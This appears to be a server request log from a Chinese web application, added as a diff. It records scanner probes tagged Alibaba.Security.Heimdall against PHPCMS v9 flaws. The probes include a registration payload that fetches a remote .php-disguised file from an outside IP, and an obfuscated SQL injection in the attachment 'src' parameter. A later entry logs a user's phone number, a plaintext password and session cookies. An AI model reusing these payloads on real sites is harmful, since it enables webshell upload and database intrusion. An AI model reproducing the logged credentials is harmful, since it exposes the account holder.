@@ -1,0 +1,3280 @@
+[ 2017-12-12T04:28:07+08:00 ] 172.31.179.54 140.205.225.198 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] dbgj.hoonking.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,199.08kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'VoRNycbm',
+  'password' => 'VoRNycbm',
+  'email' => 'VoRNycbm@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T04:28:07+08:00 ] 172.31.179.54 140.205.225.198 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T04:28:09+08:00 ] 172.31.179.54 140.205.225.198 GET /index.php?m=wap&a=index&siteid=1
+[ log ] dbgj.hoonking.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,197.82kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T04:28:09+08:00 ] 172.31.179.54 140.205.225.198 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T04:28:09+08:00 ] 172.31.179.54 140.205.225.198 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ log ] dbgj.hoonking.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.031250s][吞吐率：32.00req/s] [内存消耗：2,198.35kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T04:28:09+08:00 ] 172.31.179.54 140.205.225.198 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:27+08:00 ] 172.31.179.54 140.205.201.36 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] dbgj.hoonking.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,199.09kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'tNfOxXam',
+  'password' => 'tNfOxXam',
+  'email' => 'tNfOxXam@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:28+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:28+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php?m=wap&a=index&siteid=1
+[ log ] dbgj.hoonking.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,197.82kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:28+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:28+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ log ] dbgj.hoonking.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,198.35kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:29+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:29+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php?m=content&c=down&a_k=
+[ log ] dbgj.hoonking.com:80/index.php?m=content&c=down&a_k= [运行时间：0.031250s][吞吐率：32.00req/s] [内存消耗：2,197.89kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T13:40:29+08:00 ] 172.31.179.54 140.205.201.36 GET /index.php/index/base/login.html
+[ log ] dbgj.hoonking.com:80/index.php/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,179.39kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'dbgj.hoonking.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:17+08:00 ] 172.31.179.54 144.0.158.44 GET /favicon.ico
+[ log ] dbgj.hoonking.com/favicon.ico [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：1,773.90kb] [文件加载：41]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+)
+[ info ] [ PARAM ] array (
+  'favicon_ico' => '',
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:17+08:00 ] 172.31.179.54 144.0.158.44 GET /
+[ log ] dbgj.hoonking.com/ [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,197.69kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:17+08:00 ] 172.31.179.54 144.0.158.44 GET /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,182.63kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:18+08:00 ] 172.31.179.54 144.0.158.44 GET /favicon.ico
+[ log ] dbgj.hoonking.com/favicon.ico [运行时间：0.031250s][吞吐率：32.00req/s] [内存消耗：1,773.99kb] [文件加载：41]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=1',
+)
+[ info ] [ PARAM ] array (
+  'favicon_ico' => '',
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:24+08:00 ] 172.31.179.54 144.0.158.44 POST /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,200.19kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'origin' => 'http://dbgj.hoonking.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=1',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '31',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+  'key' => '15666666666',
+  'password' => '123456',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:25+08:00 ] 172.31.179.54 144.0.158.44 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.125000s][吞吐率：8.00req/s] [内存消耗：2,294.29kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=1',
